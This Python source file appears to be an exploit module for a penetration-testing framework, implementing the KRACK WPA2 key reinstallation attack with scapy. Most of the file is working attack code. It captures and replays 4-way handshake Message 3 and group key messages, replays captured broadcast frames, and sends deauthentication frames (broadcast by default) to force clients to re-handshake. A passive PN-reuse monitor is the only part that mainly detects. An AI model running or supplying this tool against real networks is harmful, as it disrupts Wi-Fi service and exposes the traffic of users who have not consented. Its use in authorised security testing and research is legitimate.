class Exploit(Exploit):
    """Native KRACK — WPA2 key reinstallation attack."""

    __info__ = {
        "name": "KRACK Attack (CVE-2017-13077..13088)",
        "description": (
            "Key Reinstallation Attacks on WPA2. Detects and exploits nonce "
            "reuse in the 4-way handshake (Message 3 replay), group key "
            "handshake (group PN reset), and FT reassociation. Passive "
            "monitoring for IV/PN reuse patterns. Native scapy implementation."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Original research: Mathy Vanhoef & Frank Piessens (2017)",
        ),
        "references": (
            "https://www.krackattacks.com/",
            "https://github.com/vanhoefm/krackattacks-scripts",
        ),
        "devices": ("wifi",),
    }

    interface = OptString("wlan0mon", "Monitor mode interface")
    attack = OptString(
        "monitor",
        "Mode: monitor | msg3_replay | group_replay | broadcast_replay | ft_test | deauth_trigger",
    )
    target_bssid = OptMAC("", "Target AP BSSID")
    target_client = OptMAC("", "Target client MAC")
    channel = OptInteger(1, "Wi-Fi channel")
    monitor_timeout = OptInteger(120, "Passive monitoring duration (seconds)")
    replay_count = OptInteger(5, "Number of handshake replay attempts")
    replay_interval = OptFloat(2.0, "Seconds between replays")
    output_pcap = OptString("krack_capture.pcap", "Output PCAP for captured handshakes")
    dry_run = OptBool(False, "Show configuration without executing")

    def __init__(self) -> None:
        super().__init__()
        self._iv_tracker = IvTracker()
        self._captured_msg3: list = []
        self._captured_group: list = []
        self._stop = threading.Event()

    def _passive_monitor(self) -> None:
        """Passively monitor for KRACK indicators (IV/PN reuse, handshake replays)."""
        print_status(f"Passive KRACK monitoring for {self.monitor_timeout}s...")
        handshake_count = {"msg1": 0, "msg3": 0, "group1": 0}

        def _analyze(pkt):
            if pkt.haslayer(Dot11CCMP) and pkt.addr2:
                pn = _extract_pn(pkt)
                reused = self._iv_tracker.observe(pkt.addr2, pn)
                if reused:
                    print_success(f"[KRACK] PN reuse detected: {pkt.addr2} PN={pn}")

            if _is_eapol_msg1(pkt):
                handshake_count["msg1"] += 1
            elif _is_eapol_msg3(pkt):
                handshake_count["msg3"] += 1
                self._captured_msg3.append(pkt)
                logger.info("Captured 4-way Msg3 from %s", pkt.addr2)
            elif _is_group_msg1(pkt):
                handshake_count["group1"] += 1
                self._captured_group.append(pkt)
                logger.info("Captured Group Key Msg1 from %s", pkt.addr2)

        try:
            sniff(iface=self.interface, prn=_analyze, store=False,
                  timeout=self.monitor_timeout)
        except KeyboardInterrupt:
            print_info("\nMonitoring interrupted.")

        print_info("\nHandshake messages observed:")
        for msg_type, count in handshake_count.items():
            print_info(f"  {msg_type}: {count}")

        stats = self._iv_tracker.get_stats()
        if stats:
            print_info("\nPN/IV statistics:")
            for mac, s in stats.items():
                reuse_indicator = " [REUSE DETECTED]" if s["reuses"] > 0 else ""
                print_info("  {}: {} PNs, range [{}-{}], reuses={}{}".format(
                    mac, s["observed"], s["min"], s["max"],
                    s["reuses"], reuse_indicator))

    def _msg3_replay(self) -> None:
        """Replay 4-way handshake Message 3 to trigger key reinstallation.

        Captures a legitimate Msg3 and replays it to force the client to
        reinstall the PTK, resetting the nonce counter.
        """
        if not self._captured_msg3:
            print_status("No captured Msg3 yet. Monitoring for handshakes...")
            def _capture(pkt):
                if _is_eapol_msg3(pkt):
                    self._captured_msg3.append(pkt)
                    return True
            try:
                sniff(iface=self.interface, stop_filter=_capture,
                      timeout=60, store=False)
            except KeyboardInterrupt:
                pass

        if not self._captured_msg3:
            print_error("Could not capture Msg3. Trigger a handshake first.")
            return

        msg3 = self._captured_msg3[-1]
        print_status(f"Replaying Msg3 ({self.replay_count} times, interval={self.replay_interval}s)...")

        for i in range(self.replay_count):
            sendp(msg3, iface=self.interface, verbose=False)
            print_info(f"  Replay {i + 1} sent.")
            time.sleep(self.replay_interval)

        print_success("Msg3 replay complete. Monitor for PN resets on the client.")

    def _group_replay(self) -> None:
        """Replay Group Key handshake Message 1.

        Forces reinstallation of the group temporal key (GTK), resetting
        the group PN counter and enabling broadcast frame replay.
        """
        if not self._captured_group:
            print_status("No captured Group Msg1 yet. Monitoring...")
            def _capture(pkt):
                if _is_group_msg1(pkt):
                    self._captured_group.append(pkt)
                    return True
            try:
                sniff(iface=self.interface, stop_filter=_capture,
                      timeout=60, store=False)
            except KeyboardInterrupt:
                pass

        if not self._captured_group:
            print_error("Could not capture Group Key Msg1.")
            return

        group_msg = self._captured_group[-1]
        print_status(f"Replaying Group Key Msg1 ({self.replay_count} times)...")

        for i in range(self.replay_count):
            sendp(group_msg, iface=self.interface, verbose=False)
            time.sleep(self.replay_interval)

        print_success("Group Key Msg1 replay complete.")

    def _broadcast_replay(self) -> None:
        """Test broadcast frame replay protection.

        Captures a broadcast frame and replays it to test if the receiver
        accepts frames with previously used PNs.
        """
        print_status("Capturing broadcast frames for replay test...")
        captured = []

        def _capture_broadcast(pkt):
            if (pkt.haslayer(Dot11CCMP) and pkt.addr1 and
                    pkt.addr1 == "ff:ff:ff:ff:ff:ff"):
                captured.append(pkt)
                if len(captured) >= 3:
                    return True

        try:
            sniff(iface=self.interface, stop_filter=_capture_broadcast,
                  timeout=30, store=False)
        except KeyboardInterrupt:
            pass

        if not captured:
            print_error("No broadcast frames captured.")
            return

        print_status(f"Replaying {len(captured)} broadcast frames...")
        for frame in captured:
            for _ in range(self.replay_count):
                sendp(frame, iface=self.interface, verbose=False)
                time.sleep(0.1)

        print_success("Broadcast replay test complete. Check target for acceptance.")

    def _ft_handshake_test(self) -> None:
        """Test FT (Fast BSS Transition / 802.11r) key reinstallation.

        Monitors for FT Reassociation Response messages and checks if
        the pairwise key is reinstalled during FT handshake (issue #84).
        Captures FT Auth and FT Reassoc exchanges for analysis.
        """
        print_status("FT handshake vulnerability test...")
        print_info("Monitoring for FT Auth/Reassoc exchanges...")

        ft_events: dict[str, list] = {"auth": [], "reassoc": []}

        def _monitor_ft(pkt):
            if pkt.haslayer(Dot11Auth):
                if pkt.addr2 and pkt.addr1:
                    ft_events["auth"].append({
                        "time": time.time(),
                        "ap": pkt.addr2,
                        "client": pkt.addr1,
                    })
                    logger.info("FT Auth: %s -> %s", pkt.addr2, pkt.addr1)

            if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 3:
                ft_events["reassoc"].append({
                    "time": time.time(),
                    "src": pkt.addr2,
                    "dst": pkt.addr1,
                })
                logger.info("FT Reassoc: %s -> %s", pkt.addr2, pkt.addr1)

            if pkt.haslayer(Dot11CCMP) and pkt.addr2:
                pn = _extract_pn(pkt)
                reused = self._iv_tracker.observe(pkt.addr2, pn)
                if reused:
                    print_success(f"[FT-KRACK] PN reuse after FT: {pkt.addr2} PN={pn}")

        try:
            sniff(iface=self.interface, prn=_monitor_ft, store=False,
                  timeout=self.monitor_timeout)
        except KeyboardInterrupt:
            print_info("\nFT monitoring interrupted.")

        print_info("FT events captured:")
        print_info("  Auth frames:    {}".format(len(ft_events["auth"])))
        print_info("  Reassoc frames: {}".format(len(ft_events["reassoc"])))

        stats = self._iv_tracker.get_stats()
        for mac, s in stats.items():
            if s["reuses"] > 0:
                print_success("  {} — {} PN reuses detected (FT vulnerable)".format(
                    mac, s["reuses"]))

    def _deauth_trigger(self) -> None:
        """Send deauth frames to force client re-handshake, then capture.

        Combines deauth burst with handshake capture for reliable
        Msg3 collection. Useful as precursor to msg3_replay.
        """
        if not self.target_bssid:
            print_error("target_bssid is required for deauth_trigger.")
            return

        target = self.target_client if self.target_client else "ff:ff:ff:ff:ff:ff"

        deauth_frame = RadioTap() / Dot11(
            type=0, subtype=12,
            addr1=target,
            addr2=self.target_bssid,
            addr3=self.target_bssid,
        ) / Dot11Deauth(reason=7)

        print_status(f"Sending {self.replay_count} deauth frames to trigger re-handshake...")

        capture_thread = threading.Thread(target=self._capture_handshake_async,
                                          daemon=True)
        capture_thread.start()

        time.sleep(0.5)

        for i in range(self.replay_count):
            sendp(deauth_frame, iface=self.interface, verbose=False)
            time.sleep(0.1)

        capture_thread.join(timeout=30)

        if self._captured_msg3:
            print_success(f"Captured {len(self._captured_msg3)} Msg3 frames after deauth trigger.")
        else:
            print_info("No Msg3 captured. Client may have moved or AP uses FT.")

    def _capture_handshake_async(self) -> None:
        """Capture handshake messages in background (for deauth_trigger)."""
        count_before = len(self._captured_msg3)

        def _check(pkt):
            if _is_eapol_msg3(pkt):
                self._captured_msg3.append(pkt)
                if len(self._captured_msg3) > count_before:
                    return True

        try:
            sniff(iface=self.interface, stop_filter=_check,
                  timeout=20, store=False)
        except Exception:
            pass


    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready."""
        import shutil
        import subprocess
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"

    def run(self) -> None:
        """Execute KRACK attack/test."""
        if not HAS_SCAPY:
            print_error("scapy is required. Install: pip install scapy")
            return

        if self.dry_run:
            print_info("KRACK Attack Configuration:")
            print_info(f"  Interface: {self.interface}")
            print_info(f"  Mode:      {self.attack}")
            print_info(f"  BSSID:     {self.target_bssid}")
            print_info(f"  Client:    {self.target_client}")
            print_info(f"  Channel:   {self.channel}")
            print_info(f"  Timeout:   {self.monitor_timeout}s")
            return

        if self.attack != "monitor" and os.getuid() != 0:
            print_error("Root privileges required for active attacks.")
            return

        print_success("Pre-conditions satisfied; launching exploit")
        self._exploit()

    def _exploit(self) -> None:
        """E2E exploit: dispatch chosen KRACK attack variant."""
        modes = {
            "monitor": self._passive_monitor,
            "msg3_replay": self._msg3_replay,
            "group_replay": self._group_replay,
            "broadcast_replay": self._broadcast_replay,
            "ft_test": self._ft_handshake_test,
            "deauth_trigger": self._deauth_trigger,
        }

        handler = modes.get(self.attack)
        if handler:
            handler()
        else:
            print_error("Unknown mode: {}. Options: {}".format(
                self.attack, " | ".join(modes.keys())))
